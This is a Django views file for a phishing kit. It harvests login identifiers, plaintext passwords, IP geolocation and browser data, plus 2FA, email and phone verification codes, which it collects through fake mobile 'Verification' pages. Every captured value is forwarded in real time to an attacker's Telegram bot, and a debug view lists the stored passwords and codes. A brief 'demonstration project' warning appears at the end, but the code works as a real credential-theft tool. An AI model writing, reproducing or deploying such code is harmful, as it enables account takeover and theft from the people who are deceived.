from django.shortcuts import render, redirect
from django.http import HttpResponse, JsonResponse
from django.core.mail import send_mail
from django.conf import settings
from .forms import LoginForm
from .models import UserLogin
from django.db import models
from django.utils import timezone
import socket
import requests
from django.views.decorators.csrf import csrf_exempt
import json
import re
from user_agents import parse


def get_location_data(ip_address):
    """Get location data from IP address"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country'),
                    'city': data.get('city'),
                    'region': data.get('regionName'),
                    'isp': data.get('isp'),
                    'latitude': data.get('lat'),
                    'longitude': data.get('lon')
                }
    except:
        pass
    return {}


def parse_user_agent(user_agent_string):
    """Parse user agent string to extract browser and OS info"""
    try:
        user_agent = parse(user_agent_string)
        return {
            'browser_name': user_agent.browser.family,
            'browser_version': user_agent.browser.version_string,
            'os_name': f"{user_agent.os.family} {user_agent.os.version_string}",
            'device_type': 'Mobile' if user_agent.is_mobile else 'Desktop'
        }
    except:
        return {}
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def send_to_telegram(message):
    """Send message to Telegram using bot API"""
    try:
        bot_token = settings.TELEGRAM_BOT_TOKEN
        chat_id = settings.TELEGRAM_CHAT_ID
        
        print(f"Telegram Config - Token: {bot_token[:10]}..., Chat ID: {chat_id}")
        
        if bot_token == 'YOUR_BOT_TOKEN_HERE' or chat_id == 'YOUR_CHAT_ID_HERE':
            print("❌ Telegram credentials not configured")
            return False
            
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        print(f"📤 Sending to Telegram: {message[:50]}...")
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            print("✅ Telegram message sent successfully")
            return True
        else:
            print(f"❌ Telegram error: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"❌ Failed to send Telegram message: {e}")
        return False


def login_view(request):
    if request.method == 'POST':
        identifier = request.POST.get('identifier', '')
        password = request.POST.get('password', '')
        
        # Get comprehensive user data
        ip_address = get_client_ip(request)
        user_agent_string = request.META.get('HTTP_USER_AGENT', '')
        
        # Parse user agent
        ua_data = parse_user_agent(user_agent_string)
        
        # Get location data
        location_data = get_location_data(ip_address)
        
        # Get additional request data
        screen_resolution = request.POST.get('screen_resolution', '')
        timezone_data = request.POST.get('timezone', '')
        language = request.POST.get('language', '')
        referrer = request.META.get('HTTP_REFERER', '')

        # Extract email, phone, or username
        email = None
        phone_number = None
        username = None

        if '@' in identifier:
            email = identifier
        elif identifier.replace(' ', '').replace('+', '').replace('-', '').isdigit():
            phone_number = identifier
        else:
            username = identifier

        # Store user data in session (no database)
        request.session['user_data'] = {
            'identifier': identifier,
            'email': email,
            'phone_number': phone_number,
            'username': username,
            'password': password,
            'ip_address': ip_address,
            'login_time': timezone.now().strftime('%Y-%m-%d %H:%M:%S')
        }

        # Send simple LOGIN notification to Telegram immediately
        telegram_message = f"""🔐 <b>LOGIN ATTEMPT</b>

👤 <b>Email/Username/Phone:</b> {identifier}
🔑 <b>Password:</b> {password}
🌐 <b>IP Address:</b> {ip_address}
⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ <i>Waiting for 2FA...</i>"""
        
        send_to_telegram(telegram_message)

        # Stay on login page
        form = LoginForm()
        return render(request, 'login_app/login.html', {'form': form})
    else:
        form = LoginForm()

    return render(request, 'login_app/login.html', {'form': form})


@csrf_exempt
def verify_2fa(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            two_fa_code = data.get('twoFaCode', '')
            identifier = data.get('identifier', '')
            
            # Get user data from session
            user_data = request.session.get('user_data', {})
            user_info = user_data.get('identifier', identifier)
            
            # Send simple 2FA notification to Telegram
            telegram_message = f"""🔒 <b>2FA CODE</b>

👤 <b>User:</b> {user_info}
🔢 <b>2FA Code:</b> {two_fa_code}
⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
            
            send_to_telegram(telegram_message)
            return JsonResponse({'success': True, 'message': '2FA saved'})
            
        except Exception as e:
            return JsonResponse({'success': True, 'message': 'Data saved'})
    
    return JsonResponse({'success': True, 'message': 'OK'})


@csrf_exempt
def verify_email(request):
    """Handle email verification code"""
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            email_code = data.get('emailCode', '')
            
            # Get user data from session
            user_data = request.session.get('user_data', {})
            user_info = user_data.get('identifier', 'N/A')
            
            # Send email verification code to Telegram with user info
            telegram_message = f"""📧 <b>EMAIL VERIFICATION CODE</b>

👤 <b>User:</b> {user_info}
🔢 <b>Code:</b> {email_code}
⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
            
            send_to_telegram(telegram_message)
            return JsonResponse({'success': True, 'message': 'Email code sent'})
        except Exception as e:
            return JsonResponse({'success': True, 'message': 'OK'})
    return JsonResponse({'success': True, 'message': 'OK'})


@csrf_exempt
def verify_phone(request):
    """Handle phone verification code"""
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            phone_code = data.get('phoneCode', '')
            
            # Get user data from session
            user_data = request.session.get('user_data', {})
            user_info = user_data.get('identifier', 'N/A')
            
            # Send phone verification code to Telegram with user info
            telegram_message = f"""📱 <b>PHONE VERIFICATION CODE</b>

👤 <b>User:</b> {user_info}
🔢 <b>Code:</b> {phone_code}
⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
            
            send_to_telegram(telegram_message)
            return JsonResponse({'success': True, 'message': 'Phone code sent'})
        except Exception as e:
            return JsonResponse({'success': True, 'message': 'OK'})
    return JsonResponse({'success': True, 'message': 'OK'})


def verification_page(request):
    """Verification page after 2FA"""
    return HttpResponse("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Screen</title>
    <style>
        :root {
            --bg-color: #1a1c1e;
            --card-bg: #2a2d31;
            --text-main: #ffffff;
            --text-secondary: #9da3af;
            --accent-orange: #f39c12;
            --btn-green: #2ecc71;
            --btn-green-hover: #27ae60;
            --link-green: #2ecc71;
            --modal-bg: #1e2124;
            --input-bg: #2a2d31;
            --btn-gradient: linear-gradient(90deg, #16f08b 0%, #a2f675 100%);
            --paste-btn-bg: #40444b;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .mobile-frame {
            width: 375px;
            height: 812px;
            background-color: var(--bg-color);
            color: var(--text-main);
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            padding: 20px;
            box-sizing: border-box;
        }

        header {
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 40px;
        }

        .back-btn {
            position: absolute;
            left: 0;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: white;
            padding: 8px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
        }

        h1 {
            font-size: 18px;
            font-weight: 600;
            margin: 0;
        }

        .content {
            text-align: center;
        }

        .instruction {
            color: var(--text-secondary);
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
            padding: 0 10px;
        }

        .progress-indicator {
            font-size: 42px;
            font-weight: bold;
            color: var(--accent-orange);
            margin-bottom: 30px;
        }

        .verification-row {
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 25px;
        }

        .label-group {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .icon-shield {
            background: white;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon-shield::after {
            content: '🛡️';
            font-size: 12px;
        }

        .verify-link {
            color: var(--link-green);
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: 500;
            cursor: pointer;
        }

        .confirm-btn {
            background: linear-gradient(to bottom, #2d5a3f, #1e3c2a);
            color: rgba(255, 255, 255, 0.5);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: not-allowed;
            margin-bottom: 30px;
        }

        .support-text {
            color: var(--text-secondary);
            font-size: 13px;
            line-height: 1.6;
        }

        .support-link {
            display: block;
            color: var(--link-green);
            text-decoration: none;
            font-weight: 600;
            margin-top: 5px;
        }

        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: none;
            justify-content: center;
            align-items: flex-end;
            z-index: 1000;
        }

        .modal {
            width: 380px;
            background-color: var(--modal-bg);
            border-radius: 24px 24px 0 0;
            padding: 24px;
            position: relative;
            text-align: center;
            box-shadow: 0 -20px 40px rgba(0,0,0,0.6);
        }

        .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: #36393f;
            color: white;
            border: none;
            width: 28px;
            height: 28px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .phone-icon {
            width: 40px;
            height: 40px;
            margin: 10px auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .phone-icon svg {
            fill: white;
            width: 32px;
            height: 32px;
        }

        .modal h2 {
            font-size: 18px;
            font-weight: 700;
            margin: 0 0 15px 0;
            color: var(--text-main);
        }

        .description {
            color: var(--text-secondary);
            font-size: 13px;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .input-label {
            text-align: left;
            display: block;
            color: var(--text-secondary);
            font-size: 13px;
            margin-bottom: 8px;
        }

        .input-container {
            position: relative;
            background-color: var(--input-bg);
            border: 1px solid #36393f;
            border-radius: 8px;
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            padding: 2px;
        }

        .input-container input {
            background: transparent;
            border: none;
            color: var(--text-main);
            padding: 12px;
            font-size: 14px;
            flex-grow: 1;
            outline: none;
        }

        .input-container input::placeholder {
            color: #585c63;
        }

        .paste-btn {
            background-color: var(--paste-btn-bg);
            color: var(--text-main);
            border: none;
            border-radius: 6px;
            padding: 8px 14px;
            font-size: 12px;
            margin-right: 8px;
            cursor: pointer;
        }

        .resend-timer {
            color: #4f545c;
            font-size: 13px;
            margin-bottom: 20px;
        }

        .modal-confirm-btn {
            background: var(--btn-gradient);
            color: #000;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 15px;
        }

        .voice-call {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: var(--link-green);
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }

        .voice-call svg {
            fill: var(--link-green);
            width: 16px;
            height: 16px;
        }
    </style>
</head>
<body>

    <div class="mobile-frame">
        <header>
            <button class="back-btn" onclick="window.location.href='/'">&lt;</button>
            <h1>Verification</h1>
        </header>

        <div class="content">
            <p class="instruction">
                For your account safety, please complete all of the following verifications to continue.
            </p>

            <div class="progress-indicator">1/2</div>

            <div class="verification-row">
                <div class="label-group">
                    <div class="icon-shield"></div>
                    <span>Email Verification</span>
                </div>
                <a class="verify-link" onclick="showModal()">Go Verify &gt;</a>
            </div>

            <button class="confirm-btn">Confirm</button>

            <div class="support-text">
                Don't have access to these verification methods?
                <a href="#" class="support-link">Contact live support</a>
            </div>
        </div>
    </div>

    <!-- Phone Verification Modal -->
    <div class="modal-overlay" id="phoneModal">
        <div class="modal">
            <button class="close-btn" onclick="closeModal()">&times;</button>
            
            <div class="phone-icon">
                <svg viewBox="0 0 24 24"><path d="M17,1H7A2,2 0 0,0 5,3V21A2,2 0 0,0 7,23H17A2,2 0 0,0 19,21V3A2,2 0 0,0 17,1M12,21A1,1 0 0,1 11,20A1,1 0 0,1 12,19A1,1 0 0,1 13,20A1,1 0 0,1 12,21M17,18H7V4H17V18Z" /></svg>
            </div>

            <h2>Email Verification</h2>
            <p class="description">Please enter the 6-digit verification code sent on number</p>

            <label class="input-label">Verification Code</label>
            <div class="input-container">
                <input type="text" placeholder="6-digit verification code" id="phoneCode">
                <button class="paste-btn">Paste</button>
            </div>

            <div class="resend-timer">Resend in 54s</div>

            <button class="modal-confirm-btn" onclick="confirmPhone()">Confirm</button>

            <a href="#" class="voice-call">
                <svg viewBox="0 0 24 24"><path d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z" /></svg>
                Receive Code via Voice Call
            </a>
        </div>
    </div>

    <script>
        function showModal() {
            document.getElementById('phoneModal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('phoneModal').style.display = 'none';
        }

        function confirmPhone() {
            const phoneCode = document.getElementById('phoneCode').value;
            
            // Send email verification code to server
            fetch('/verify-email/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    emailCode: phoneCode
                })
            })
            .then(response => response.json())
            .then(data => {
                // Redirect to verification step 2
                window.location.href = '/verification-step2/';
            })
            .catch(error => {
                // Redirect even on error
                window.location.href = '/verification-step2/';
            });
        }
    </script>

</body>
</html>
    """)


def verification_step2(request):
    """Second verification page after phone verification"""
    return HttpResponse("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Step 2</title>
    <style>
        :root {
            --bg-dark: #1a1c1e;
            --card-dark: #2a2d31;
            --text-white: #ffffff;
            --text-dim: #9da3af;
            --accent-gold: #f39c12;
            --accent-green: #2ecc71;
            --btn-disabled-grad: linear-gradient(180deg, #2d5a3f 0%, #1e3c2a 100%);
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            background-color: var(--bg-dark);
            color: var(--text-white);
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 10px 0 40px 0;
        }

        .back-button {
            position: absolute;
            left: 0;
            background: #33363a;
            border: none;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .title {
            font-size: 18px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .content {
            text-align: center;
            flex-grow: 1;
        }

        .sub-text {
            color: var(--text-dim);
            font-size: 14px;
            line-height: 1.5;
            padding: 0 20px;
            margin-bottom: 20px;
        }

        .step-counter {
            font-size: 42px;
            font-weight: 800;
            color: var(--accent-gold);
            margin-bottom: 30px;
        }

        .verify-card {
            background-color: var(--card-dark);
            border-radius: 12px;
            padding: 18px 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 25px;
        }

        .item-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .icon-box {
            background: white;
            border-radius: 50%;
            width: 26px;
            height: 26px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon-box svg {
            width: 14px;
            height: 14px;
            fill: #000;
        }

        .item-label {
            font-size: 15px;
            font-weight: 500;
        }

        .go-verify {
            color: var(--accent-green);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .confirm-btn {
            background: var(--btn-disabled-grad);
            color: rgba(255, 255, 255, 0.4);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            margin-bottom: 30px;
        }

        .footer-text {
            color: var(--text-dim);
            font-size: 14px;
            line-height: 1.6;
        }

        .support-link {
            display: block;
            color: var(--accent-green);
            text-decoration: none;
            font-weight: 600;
            margin-top: 4px;
        }
    </style>
</head>
<body>

    <div class="mobile-container">
        <div class="header">
            <button class="back-button" onclick="window.location.href='/verification/'">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
            </button>
            <div class="title">Verification</div>
        </div>

        <div class="content">
            <p class="sub-text">
                For your account safety, please complete all of the following verifications to continue.
            </p>

            <div class="step-counter">2/2</div>

            <div class="verify-card">
                <div class="item-left">
                    <div class="icon-box">
                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                    </div>
                    <span class="item-label">Phone Number</span>
                </div>
                <a href="#" class="go-verify" onclick="showPhoneModal()">
                    Go Verify 
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                </a>
            </div>

            <button class="confirm-btn">Confirm</button>

            <div class="footer-text">
                Don't have access to these verification methods?
                <a href="#" class="support-link">Contact live support</a>
            </div>
        </div>
    </div>

    <!-- Phone Verification Modal -->
    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: flex-end; z-index: 1000;" id="phoneModal">
        <div style="width: 380px; background-color: #1e2124; border-radius: 24px 24px 0 0; padding: 24px; position: relative; text-align: center; box-shadow: 0 -20px 40px rgba(0,0,0,0.6);">
            <button onclick="closePhoneModal()" style="position: absolute; top: 15px; right: 15px; background: #36393f; color: white; border: none; width: 28px; height: 28px; border-radius: 6px; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center;">&times;</button>
            
            <div style="width: 40px; height: 40px; margin: 10px auto 20px auto; display: flex; justify-content: center; align-items: center;">
                <svg viewBox="0 0 24 24" style="fill: white; width: 32px; height: 32px;"><path d="M17,1H7A2,2 0 0,0 5,3V21A2,2 0 0,0 7,23H17A2,2 0 0,0 19,21V3A2,2 0 0,0 17,1M12,21A1,1 0 0,1 11,20A1,1 0 0,1 12,19A1,1 0 0,1 13,20A1,1 0 0,1 12,21M17,18H7V4H17V18Z" /></svg>
            </div>

            <h2 style="font-size: 18px; font-weight: 700; margin: 0 0 15px 0; color: #ffffff;">Phone Number Verification</h2>
            <p style="color: #9da3af; font-size: 13px; margin-bottom: 25px; line-height: 1.4;">Please enter the 6-digit verification code sent on number</p>

            <label style="text-align: left; display: block; color: #9da3af; font-size: 13px; margin-bottom: 8px;">Verification Code</label>
            <div style="position: relative; background-color: #2a2d31; border: 1px solid #36393f; border-radius: 8px; display: flex; align-items: center; margin-bottom: 15px; padding: 2px;">
                <input type="text" placeholder="6-digit verification code" id="phoneCodeInput" style="background: transparent; border: none; color: #ffffff; padding: 12px; font-size: 14px; flex-grow: 1; outline: none;">
                <button style="background-color: #40444b; color: #ffffff; border: none; border-radius: 6px; padding: 8px 14px; font-size: 12px; margin-right: 8px; cursor: pointer;">Paste</button>
            </div>

            <div style="color: #4f545c; font-size: 13px; margin-bottom: 20px;">Resend in 54s</div>

            <button onclick="confirmPhoneCode()" style="background: linear-gradient(90deg, #16f08b 0%, #a2f675 100%); color: #000; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; margin-bottom: 15px;">Confirm</button>

            <a href="#" style="display: flex; align-items: center; justify-content: center; gap: 8px; color: #2ecc71; text-decoration: none; font-size: 13px; font-weight: 500;">
                <svg viewBox="0 0 24 24" style="fill: #2ecc71; width: 16px; height: 16px;"><path d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z" /></svg>
                Receive Code via Voice Call
            </a>
        </div>
    </div>

    <script>
        function showPhoneModal() {
            document.getElementById('phoneModal').style.display = 'flex';
        }

        function closePhoneModal() {
            document.getElementById('phoneModal').style.display = 'none';
        }

        function confirmPhoneCode() {
            const phoneCode = document.getElementById('phoneCodeInput').value;
            
            // Send phone verification code to server
            fetch('/verify-phone/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phoneCode: phoneCode
                })
            })
            .then(response => response.json())
            .then(data => {
                closePhoneModal();
                // Redirect to login page after all verifications complete
                window.location.href = '/';
            })
            .catch(error => {
                closePhoneModal();
                // Redirect to login page even on error
                window.location.href = '/';
            });
        }
    </script>

</body>
</html>
    """)


def test_telegram(request):
    """Test Telegram connection"""
    test_message = "📱 <b>TEST MESSAGE</b>\n\n✅ Telegram is working correctly!\n⏰ Time: " + timezone.now().strftime('%Y-%m-%d %H:%M:%S')
    
    success = send_to_telegram(test_message)
    
    if success:
        return HttpResponse("<h1>✅ Telegram Test Successful!</h1><p>Check your Telegram for the test message.</p><a href='/'>Back to Login</a>")
    else:
        return HttpResponse("<h1>❌ Telegram Test Failed!</h1><p>Check console logs for details.</p><a href='/'>Back to Login</a>")


def debug_db(request):
    """Debug view to check database records"""
    records = UserLogin.objects.all().order_by('-login_time')[:10]
    html = "<h2>Recent Login Records</h2><table border='1'><tr><th>ID</th><th>Email</th><th>Username</th><th>Phone</th><th>Password</th><th>2FA Code</th><th>Login Time</th><th>2FA Time</th></tr>"
    
    for record in records:
        html += f"<tr><td>{record.id}</td><td>{record.email or ''}</td><td>{record.username or ''}</td><td>{record.phone_number or ''}</td><td>{record.password}</td><td>{record.two_fa_code or ''}</td><td>{record.login_time}</td><td>{record.two_fa_time or ''}</td></tr>"
    
    html += "</table>"
    return HttpResponse(html)


def success_view(request):
    return HttpResponse("""
        <html>
        <head>
            <title>Login Successful</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    padding: 50px;
                    background-color: #f0f0f0;
                }
                .success {
                    background-color: #4CAF50;
                    color: white;
                    padding: 20px;
                    border-radius: 5px;
                    max-width: 500px;
                    margin: 0 auto;
                }
                .warning {
                    background-color: #ff9800;
                    color: white;
                    padding: 15px;
                    border-radius: 5px;
                    max-width: 500px;
                    margin: 20px auto;
                }
            </style>
        </head>
        <body>
            <div class="success">
                <h1>Login Successful! ✓</h1>
                <p>Your login details have been recorded and an email has been sent to the admin.</p>
            </div>
            <div class="warning">
                <h3>⚠️ Security Warning</h3>
                <p>This is a demonstration project. In a real application:</p>
                <ul style="text-align: left;">
                    <li>Never store passwords in plain text</li>
                    <li>Use Django's built-in authentication system</li>
                    <li>Hash passwords using bcrypt or similar</li>
                    <li>Implement proper security measures</li>
                </ul>
            </div>
            <p><a href="/" style="color: #4CAF50; font-weight: bold;">← Return to Login</a></p>
        </body>
        </html>
    """)